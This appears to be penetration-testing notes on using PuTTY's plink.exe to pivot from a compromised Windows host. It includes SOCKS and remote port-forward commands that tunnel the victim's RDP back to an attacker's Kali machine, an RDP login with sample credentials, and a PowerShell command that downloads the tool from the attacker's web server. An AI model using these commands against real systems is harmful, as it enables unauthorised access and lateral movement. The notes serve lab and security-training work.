---
description: >-
  Plink, short for PuTTY Link, is a Windows command-line tool that comes as a
  part of PuTTY. The tool is a choice for many sysadmins.
---

# plink.exe

Before 2018, Windows did not have a native SSH client so users would have to install their own. Plink is PuTTy's command-line counterpart.

Instead of pulling our own tools onto a host and risk the chance of being exposed, we can live off the land and use what is already there.

## Using plink.exe

### Dynamic Port Forward

```bash
C:\Users\Windows-Victim\>plink -D 9050 jump-host@10.129.15.50
```

The `-D` flag sets up dynamic port forward. The client listens on port `9050` and implements a SOCKS server.

### Remote Port Forward

```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### Confirming Port Forward

```shell-session
kali@kali:~$ ss -ntplu
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp   LISTEN 0      128        127.0.0.1:9833      0.0.0.0:*
tcp   LISTEN 0      5            0.0.0.0:80        0.0.0.0:*     users:(("python3",pid=1048255,fd=3)) 
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
tcp   LISTEN 0      128             [::]:22           [::]:*
kali@kali:~$ 
```

We open local port **9833** on our Kali Host

### Connecting Successfully

```shell-session
kali@kali$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```



## Pulling plink.exe on compromised host

We can pull the plink.exe binary on our compromised host

### Locating Binary on Kali Box

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
</strong></code></pre>



### Downloading Binary on Compromised host

```bash
C:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```



Another Windows-based tool called [Proxifier](https://www.proxifier.com/) can be used to start a SOCKS tunnel via the SSH session we created.&#x20;
